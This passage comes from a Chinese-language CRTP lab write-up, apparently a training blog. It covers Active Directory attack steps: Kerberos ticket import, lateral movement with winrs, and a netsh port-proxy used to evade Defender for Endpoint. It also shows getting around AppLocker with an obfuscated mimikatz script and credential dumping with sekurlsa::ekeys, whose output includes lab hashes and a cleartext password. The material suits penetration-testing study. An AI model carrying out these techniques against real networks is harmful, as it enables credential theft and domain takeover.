class="number">4</span>TSakhzSMimmreF/OLUy8IqE8SuNxh5EbaRGQlyqs2qo5GxxKtVtBJjJ6CIc72QiRvCkYs/w8I1EWm+U</span><br><span class="line">      pDAJo4IBEzCCAQ+gAwIBAKKCAQYEggECfYH/MIH8oIH5MIH2MIHzoCswKaADAgESoSIEIPOtjFRkQZ2v</span><br><span class="line">      NYD/Co6/qUFRqIqWOuVAMEi0OGnLBmcKoRwbGkRPTExBUkNPUlAuTU9ORVlDT1JQLkxPQ0FMohUwE6AD</span><br><span class="line">      AgEBoQwwChsIc3ZjYWRtaW6jBwMFAEDhAAClERgPMjAyNTA1MjUwODI2MDBaphEYDzIwMjUwNTI1MTgy</span><br><span class="line">      NjAwWqcRGA8yMDI1MDYwMTA4MjYwMFqoHBsaRE9MTEFSQ09SUC5NT05FWUNPUlAuTE9DQUypLzAtoAMC</span><br><span class="line">      AQKhJjAkGwZrcmJ0Z3QbGkRPTExBUkNPUlAuTU9ORVlDT1JQLkxPQ0FM</span><br><span class="line">[+] Ticket successfully imported!</span><br><span class="line"></span><br><span class="line">  ServiceName              :  krbtgt/DOLLARCORP.MONEYCORP.LOCAL</span><br><span class="line">  ServiceRealm             :  DOLLARCORP.MONEYCORP.LOCAL</span><br><span class="line">  UserName                 :  svcadmin (NT_PRINCIPAL)</span><br><span class="line">  UserRealm                :  DOLLARCORP.MONEYCORP.LOCAL</span><br><span class="line">  StartTime                :  <span class="number">5</span>/<span class="number">25</span>/<span class="number">2025</span> <span class="number">1</span>:<span class="number">26</span>:<span class="number">00</span> AM</span><br><span class="line">  EndTime                  :  <span class="number">5</span>/<span class="number">25</span>/<span class="number">2025</span> <span class="number">11</span>:<span class="number">26</span>:<span class="number">00</span> AM</span><br><span class="line">  RenewTill                :  <span class="number">6</span>/<span class="number">1</span>/<span class="number">2025</span> <span class="number">1</span>:<span class="number">26</span>:<span class="number">00</span> AM</span><br><span class="line">  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable</span><br><span class="line">  KeyType                  :  aes256_cts_hmac_sha1</span><br><span class="line">  Base64(key)              :  <span class="number">862</span>MVGRBna81gP8Kjr+pQVGoipY65UAwSLQ4acsGZwo=</span><br><span class="line">  ASREP (key)              :  <span class="number">6366243</span>A657A4EA04E406F1ABC27F1ADA358CCD0138EC5CA2835067719DC7011</span><br></pre></td></tr></table></figure>

<p><code>klist</code> 看到票据已经注入完了</p>
<p><img src="/wpimages/2025/crtp-lab-note/image-26.png" alt="alt text"></p>
<p>然后查询这个账户能登陆的机器（子域的域管账户理所当然的都能上)</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\student522\desktop&gt; <span class="built_in">Find-LocalAdminAccess</span></span><br><span class="line">dcorp<span class="literal">-dc</span>.dollarcorp.moneycorp.local</span><br><span class="line">dcorp<span class="literal">-adminsrv</span>.dollarcorp.moneycorp.local</span><br><span class="line">dcorp<span class="literal">-appsrv</span>.dollarcorp.moneycorp.local</span><br><span class="line">dcorp<span class="literal">-ci</span>.dollarcorp.moneycorp.local</span><br><span class="line">dcorp<span class="literal">-mgmt</span>.dollarcorp.moneycorp.local</span><br><span class="line">dcorp<span class="literal">-mssql</span>.dollarcorp.moneycorp.local</span><br><span class="line">dcorp<span class="literal">-sql1</span>.dollarcorp.moneycorp.local</span><br><span class="line">dcorp<span class="literal">-stdadmin</span>.dollarcorp.moneycorp.local</span><br></pre></td></tr></table></figure>

<h2 id="Learning-Objective-7-3"><a href="#Learning-Objective-7-3" class="headerlink" title="Learning Objective - 7 - 3"></a>Learning Objective - 7 - 3</h2><blockquote>
<p>We tried to extract clear-text credentials for scheduled tasks from? Flag value is like lsass, registry, credential vault etc.</p>
</blockquote>
<blockquote>
<p>我们尝试提取计划任务的明文凭证是存在哪里的?（flag类似于Isass、注册表、凭证库等。）</p>
</blockquote>
<p>这个flag这里需要移动到 <code>dcorp-adminsrv</code> 机器做。</p>
<p>因为当前有svcadmin这个da账户，可以直接访问过去。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\ad\tools&gt; winrs <span class="literal">-r</span>:dcorp<span class="literal">-adminsrv</span> cmd</span><br><span class="line">Microsoft Windows [<span class="type">Version</span> <span class="number">10.0</span><span class="type">.20348.2762</span>]</span><br><span class="line">(c) Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Users\svcadmin&gt;<span class="built_in">set</span> computer</span><br><span class="line"><span class="built_in">set</span> computer</span><br><span class="line">COMPUTERNAME=DCORP<span class="literal">-ADMINSRV</span></span><br></pre></td></tr></table></figure>

<p>先落地一个loader.exe 然后为了加载别的方便。</p>
<p>这里为了规避mde。所以把学生机器工具的http先走一层代理到到目标本地来做，因为mde对自己本地ip的落地的东西没那么敏感。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\svcadmin&gt; netsh interface portproxy add v4tov4 listenport=<span class="number">8080</span> listenaddress=<span class="number">0.0</span>.<span class="number">0.0</span> connectport=<span class="number">8080</span> connectaddress=<span class="number">172.16</span>.<span class="number">100.22</span></span><br><span class="line">netsh interface portproxy add v4tov4 listenport=<span class="number">8080</span> listenaddress=<span class="number">0.0</span>.<span class="number">0.0</span> connectport=<span class="number">8080</span> connectaddress=<span class="number">172.16</span>.<span class="number">100.22</span></span><br></pre></td></tr></table></figure>

<p>然后download一下loader</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\svcadmin&gt; <span class="built_in">curl</span> <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">8080</span>/loader.exe <span class="literal">-o</span> lader.exe</span><br><span class="line"><span class="built_in">PS</span> C:\Users\svcadmin&gt; <span class="built_in">ls</span></span><br><span class="line"></span><br><span class="line">    Directory: C:\Users\svcadmin</span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name</span><br><span class="line"><span class="literal">----</span>                 <span class="literal">-------------</span>         <span class="literal">------</span> <span class="literal">----</span></span><br><span class="line">d<span class="literal">-r---</span>          <span class="number">5</span>/<span class="number">8</span>/<span class="number">2021</span>   <span class="number">1</span>:<span class="number">15</span> AM                Desktop</span><br><span class="line">d<span class="literal">-r---</span>         <span class="number">5</span>/<span class="number">25</span>/<span class="number">2025</span>   <span class="number">1</span>:<span class="number">49</span> AM                Documents</span><br><span class="line">d<span class="literal">-r---</span>          <span class="number">5</span>/<span class="number">8</span>/<span class="number">2021</span>   <span class="number">1</span>:<span class="number">15</span> AM                Downloads</span><br><span class="line">d<span class="literal">-r---</span>          <span class="number">5</span>/<span class="number">8</span>/<span class="number">2021</span>   <span class="number">1</span>:<span class="number">15</span> AM                Favorites</span><br><span class="line">d<span class="literal">-r---</span>          <span class="number">5</span>/<span class="number">8</span>/<span class="number">2021</span>   <span class="number">1</span>:<span class="number">15</span> AM                Links</span><br><span class="line">d<span class="literal">-r---</span>          <span class="number">5</span>/<span class="number">8</span>/<span class="number">2021</span>   <span class="number">1</span>:<span class="number">15</span> AM                Music</span><br><span class="line">d<span class="literal">-r---</span>          <span class="number">5</span>/<span class="number">8</span>/<span class="number">2021</span>   <span class="number">1</span>:<span class="number">15</span> AM                Pictures</span><br><span class="line">d<span class="literal">-----</span>          <span class="number">5</span>/<span class="number">8</span>/<span class="number">2021</span>   <span class="number">1</span>:<span class="number">15</span> AM                Saved Games</span><br><span class="line">d<span class="literal">-r---</span>          <span class="number">5</span>/<span class="number">8</span>/<span class="number">2021</span>   <span class="number">1</span>:<span class="number">15</span> AM                Videos</span><br><span class="line"><span class="literal">-a----</span>         <span class="number">5</span>/<span class="number">25</span>/<span class="number">2025</span>   <span class="number">1</span>:<span class="number">57</span> AM           <span class="number">4211</span> a</span><br><span class="line"><span class="literal">-a----</span>         <span class="number">5</span>/<span class="number">25</span>/<span class="number">2025</span>   <span class="number">2</span>:<span class="number">16</span> AM         <span class="number">110592</span> lader.exe</span><br></pre></td></tr></table></figure>

<p>企图运行的时候报错了，说是被组策略拦住了</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\svcadmin&gt; .\lader.exe <span class="literal">-h</span></span><br><span class="line">.\lader.exe <span class="literal">-h</span></span><br><span class="line">Program <span class="string">&#x27;lader.exe&#x27;</span> failed to run: This program is blocked by <span class="built_in">group</span> policy. <span class="keyword">For</span> more information, contact your system</span><br></pre></td></tr></table></figure>

<p>查询一下当前powershell的语言模式，是受限状态 <code>ConstrainedLanguage</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\svcadmin&gt; $ExecutionContext.sessionstate.languagemode</span><br><span class="line">ConstrainedLanguage</span><br></pre></td></tr></table></figure>

<p>而通常会出现受限有一定概率是开了 <code>applocker</code></p>
<p>可以先通过查看注册表 <code>HKLM\Software\Policies\Microsoft\Windows\SRPV2</code> 来做个基础判断srpv2开没开（Software Restriction Policies v2）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\svcadmin&gt;  reg query hklm\software\policies\microsoft\windows\srpv2</span><br><span class="line">HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\srpv2\Appx</span><br><span class="line">HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\srpv2\Dll</span><br><span class="line">HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\srpv2\Exe</span><br><span class="line">HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\srpv2\Msi</span><br><span class="line">HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\srpv2\Script</span><br></pre></td></tr></table></figure>

<p>能看到 <code>Script</code>和 <code>exe</code> 都在，以及还有其他的，那基本可以确定applocker是开了</p>
<p>具体要看策略内容要看script内策略咋写的，这里看到他写了仨脚本</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\svcadmin&gt; reg query HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\srpv2\Script</span><br><span class="line"></span><br><span class="line">HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\srpv2\Script</span><br><span class="line">    AllowWindows    REG_DWORD    <span class="number">0</span>x0</span><br><span class="line"></span><br><span class="line">HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\srpv2\Script\<span class="number">06</span>dce67b<span class="literal">-934c-454f-a263-2515c8796a5d</span></span><br><span class="line">HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\srpv2\Script\<span class="number">8</span>a64fa2c<span class="literal">-8c17-415a-8505-44fc7d7810ad</span></span><br><span class="line">HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\srpv2\Script\<span class="number">9428</span>c672<span class="literal">-5fc3-47f4-808a-a0011f36dd2c</span></span><br></pre></td></tr></table></figure>

<p>具体挨个细看下.</p>
<p>这第一条策略，是个applocker默认的策略，它允许 <code>\PROGRAMFILES\</code>目录下的程式执行。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\svcadmin&gt; reg query HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\srpv2\Script\<span class="number">06</span>dce67b<span class="literal">-934c-454f-a263-2515c8796a5d</span></span><br><span class="line">    Value    REG_SZ    &lt;FilePathRule Id=<span class="string">&quot;06dce67b-934c-454f-a263-2515c8796a5d&quot;</span> Name=<span class="string">&quot;(Default Rule) All scripts located in the Program Files folder&quot;</span> Description=<span class="string">&quot;Allows members of the Everyone group to run scripts that are located in the Program Files folder.&quot;</span> UserOrGroupSid=<span class="string">&quot;S-1-1-0&quot;</span> Action=<span class="string">&quot;Allow&quot;</span>&gt;&lt;Conditions&gt;&lt;FilePathCondition Path=<span class="string">&quot;%PROGRAMFILES%\*&quot;</span>/&gt;&lt;/Conditions&gt;&lt;/FilePathRule&gt;</span><br></pre></td></tr></table></figure>

<p>第二个要求得有微软签名的才可以</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\svcadmin&gt; reg query HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\srpv2\Script\<span class="number">8</span>a64fa2c<span class="literal">-8c17-415a-8505-44fc7d7810ad</span></span><br><span class="line"></span><br><span class="line">    Value    REG_SZ    &lt;FilePublisherRule Id=<span class="string">&quot;8a64fa2c-8c17-415a-8505-44fc7d7810ad&quot;</span> Name=<span class="string">&quot;Signed by O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US&quot;</span> Description=<span class="string">&quot;&quot;</span> UserOrGroupSid=<span class="string">&quot;S-1-1-0&quot;</span> Action=<span class="string">&quot;Allow&quot;</span>&gt;&lt;Conditions&gt;&lt;FilePublisherCondition PublisherName=<span class="string">&quot;O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US&quot;</span> ProductName=<span class="string">&quot;*&quot;</span> BinaryName=<span class="string">&quot;*&quot;</span>&gt;&lt;BinaryVersionRange LowSection=<span class="string">&quot;*&quot;</span> HighSection=<span class="string">&quot;*&quot;</span>/&gt;&lt;/FilePublisherCondition&gt;&lt;/Conditions&gt;&lt;/FilePublisherRule&gt;</span><br></pre></td></tr></table></figure>

<p>第三条和第一条差不多，也是默认的策略，允许windir下的程式执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\svcadmin&gt; reg query HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\srpv2\Script\9428c672-5fc3-47f4-808a-a0011f36dd2c</span><br><span class="line">reg query HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\srpv2\Script\9428c672-5fc3-47f4-808a-a0011f36dd2c</span><br><span class="line"></span><br><span class="line">HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\srpv2\Script\9428c672-5fc3-47f4-808a-a0011f36dd2c</span><br><span class="line">    Value    REG_SZ    &lt;FilePathRule Id=&quot;9428c672-5fc3-47f4-808a-a0011f36dd2c&quot; Name=&quot;(Default Rule) All scripts located in the Windows folder&quot; Description=&quot;Allows members of the Everyone group to run scripts that are located in the Windows folder.&quot; UserOrGroupSid=&quot;S-1-1-0&quot; Action=&quot;Allow&quot;&gt;&lt;Conditions&gt;&lt;FilePathCondition Path=&quot;%WINDIR%\*&quot;/&gt;&lt;/Conditions&gt;&lt;/FilePathRule&gt;</span><br></pre></td></tr></table></figure>

<p>如果不想手动挨条看可以用 <code>Get-AppLockerPolicy -Effective</code>然后展开看他 <code>RuleCollections</code> 属性</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\svcadmin&gt; Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections</span><br><span class="line">Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PublisherConditions : &#123;*\O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US\*,*&#125;</span><br><span class="line">PublisherExceptions : &#123;&#125;</span><br><span class="line">PathExceptions      : &#123;&#125;</span><br><span class="line">HashExceptions      : &#123;&#125;</span><br><span class="line">Id                  : 38a711c4-c0b8-46ee-98cf-c9636366548e</span><br><span class="line">Name                : Signed by O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US</span><br><span class="line">Description         :</span><br><span class="line">UserOrGroupSid      : S-1-1-0</span><br><span class="line">Action              : Allow</span><br><span class="line"></span><br><span class="line">PublisherConditions : &#123;*\O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US\*,*&#125;</span><br><span class="line">PublisherExceptions : &#123;&#125;</span><br><span class="line">PathExceptions      : &#123;&#125;</span><br><span class="line">HashExceptions      : &#123;&#125;</span><br><span class="line">Id                  : 8a64fa2c-8c17-415a-8505-44fc7d7810ad</span><br><span class="line">Name                : Signed by O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US</span><br><span class="line">Description         :</span><br><span class="line">UserOrGroupSid      : S-1-1-0</span><br><span class="line">Action              : Allow</span><br><span class="line"></span><br><span class="line">PathConditions      : &#123;%PROGRAMFILES%\*&#125;</span><br><span class="line">PathExceptions      : &#123;&#125;</span><br><span class="line">PublisherExceptions : &#123;&#125;</span><br><span class="line">HashExceptions      : &#123;&#125;</span><br><span class="line">Id                  : 06dce67b-934c-454f-a263-2515c8796a5d</span><br><span class="line">Name                : (Default Rule) All scripts located in the Program Files folder</span><br><span class="line">Description         : Allows members of the Everyone group to run scripts that are located in the Program Files folder.</span><br><span class="line">UserOrGroupSid      : S-1-1-0</span><br><span class="line">Action              : Allow</span><br><span class="line"></span><br><span class="line">PathConditions      : &#123;%WINDIR%\*&#125;</span><br><span class="line">PathExceptions      : &#123;&#125;</span><br><span class="line">PublisherExceptions : &#123;&#125;</span><br><span class="line">HashExceptions      : &#123;&#125;</span><br><span class="line">Id                  : 9428c672-5fc3-47f4-808a-a0011f36dd2c</span><br><span class="line">Name                : (Default Rule) All scripts located in the Windows folder</span><br><span class="line">Description         : Allows members of the Everyone group to run scripts that are located in the Windows folder.</span><br><span class="line">UserOrGroupSid      : S-1-1-0</span><br><span class="line">Action              : Allow</span><br></pre></td></tr></table></figure>

<p>这里我选择用 <code>&#123;%WINDIR%\*&#125;</code> 文件目录，因为由applocker的限制目前只能执行脚本了，同时因为powershell语言模式受限制</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_language_modes?view=powershell-7.5">https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_language_modes?view=powershell-7.5</a></p>
</blockquote>
<p>这里只能执行脚本，而且还没办法传参数，所以用 <code>invoke-mimi.ps1</code> 脚本来执行。</p>
<p>因为不能命令行传参数，直接把命令写到脚本末尾，简单混淆了一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$1=&quot;s&quot;;</span><br><span class="line">$2=&quot;e&quot;</span><br><span class="line">$3=&quot;k&quot;</span><br><span class="line">$4=&quot;u&quot;</span><br><span class="line">$5=&quot;r&quot;</span><br><span class="line">$6=&quot;l&quot;</span><br><span class="line">$7=&quot;a&quot;</span><br><span class="line">$8=&quot;:&quot;</span><br><span class="line">$9=&quot;y&quot;</span><br><span class="line"></span><br><span class="line">$a = $1+$2+$3+$4+$5+$6+$1+$7+$8+$8+$2+$3+$2+$9+$1</span><br><span class="line"></span><br><span class="line">Invoke-Mimi -Command $a</span><br></pre></td></tr></table></figure>


<p><img src="/wpimages/2025/crtp-lab-note/image-27.png" alt="alt text"></p>
<p>然后落地到机器上</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS C:\windows&gt; curl 127.0.0.1:8080/mimi-key.ps1 -o mimi.ps1</span><br><span class="line">curl 127.0.0.1:8080/mimi-key.ps1 -o mimi.ps1</span><br></pre></td></tr></table></figure>

<p>直接执行，就运行了 <code>sekurlsa::ekeys</code></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\windows&gt; .\mimi.ps1</span><br><span class="line">.\mimi.ps1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  .<span class="comment">#####.   mimikatz 2.2.0 (x64) #19041 May 23 2024 17:47:47</span></span><br><span class="line"> .<span class="comment">## ^ ##.  &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo)</span></span><br><span class="line"> <span class="comment">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span></span><br><span class="line"> <span class="comment">## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz</span></span><br><span class="line"> <span class="string">&#x27;## v ##&#x27;</span>       Vincent LE TOUX             ( vincent.letoux@gmail.com )</span><br><span class="line">  <span class="string">&#x27;#####&#x27;</span>        &gt; https://pingcastle.com / https://mysmartlogon.com ***/</span><br><span class="line"></span><br><span class="line">mimikatz(powershell) <span class="comment"># sekurlsa::ekeys</span></span><br><span class="line"></span><br><span class="line">Authentication Id : <span class="number">0</span> ; <span class="number">914181</span> (<span class="number">00000000</span>:<span class="number">000</span>df305)</span><br><span class="line">Session           : RemoteInteractive from <span class="number">2</span></span><br><span class="line">User Name         : srvadmin</span><br><span class="line">Domain            : dcorp</span><br><span class="line">Logon Server      : DCORP<span class="literal">-DC</span></span><br><span class="line">Logon Time        : <span class="number">1</span>/<span class="number">17</span>/<span class="number">2025</span> <span class="number">12</span>:<span class="number">47</span>:<span class="number">22</span> AM</span><br><span class="line">SID               : S<span class="literal">-1-5-21-719815819-3726368948-3917688648-1115</span></span><br><span class="line"></span><br><span class="line">         * Username : srvadmin</span><br><span class="line">         * Domain   : DOLLARCORP.MONEYCORP.LOCAL</span><br><span class="line">         * Password : (null)</span><br><span class="line">         * Key List :</span><br><span class="line">           aes256_hmac       <span class="number">145019659</span>e1da3fb150ed94d510eb770276cfbd0cbd834a4ac331f2effe1dbb4</span><br><span class="line">           rc4_hmac_nt       a98e18228819e8eec3dfa33cb68b0728</span><br><span class="line">           rc4_hmac_old      a98e18228819e8eec3dfa33cb68b0728</span><br><span class="line">           rc4_md4           a98e18228819e8eec3dfa33cb68b0728</span><br><span class="line">           rc4_hmac_nt_exp   a98e18228819e8eec3dfa33cb68b0728</span><br><span class="line">           rc4_hmac_old_exp  a98e18228819e8eec3dfa33cb68b0728</span><br><span class="line"></span><br><span class="line">Authentication Id : <span class="number">0</span> ; <span class="number">131858</span> (<span class="number">00000000</span>:<span class="number">00020312</span>)</span><br><span class="line">Session           : Service from <span class="number">0</span></span><br><span class="line">User Name         : websvc</span><br><span class="line">Domain            : dcorp</span><br><span class="line">Logon Server      : DCORP<span class="literal">-DC</span></span><br><span class="line">Logon Time        : <span class="number">1</span>/<span class="number">16</span>/<span class="number">2025</span> <span class="number">11</span>:<span class="number">18</span>:<span class="number">59</span> PM</span><br><span class="line">SID               : S<span class="literal">-1-5-21-719815819-3726368948-3917688648-1114</span></span><br><span class="line"></span><br><span class="line">         * Username : websvc</span><br><span class="line">         * Domain   : DOLLARCORP.MONEYCORP.LOCAL</span><br><span class="line">         * Password : AServicewhichIsNotM3@nttoBe</span><br><span class="line">         * Key List :</span><br><span class="line">           aes256_hmac       <span class="number">2</span>d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7</span><br><span class="line">           aes128_hmac       <span class="number">86</span>a353c1ea16a87c39e2996253211e41</span><br><span class="line">           rc4_hmac_nt       cc098f204c5887eaa8253e7c2749156f</span><br><span class="line">           rc4_hmac_old      cc098f204c5887eaa8253e7c2749156f</span><br><span class="line">           rc4_md4           cc098f204c5887eaa8253e7c2749156f</span><br><span class="line">           rc4_hmac_nt_exp   cc098f204c5887eaa8253e7c2749156f</span><br><span class="line">           rc4_hmac_old_exp  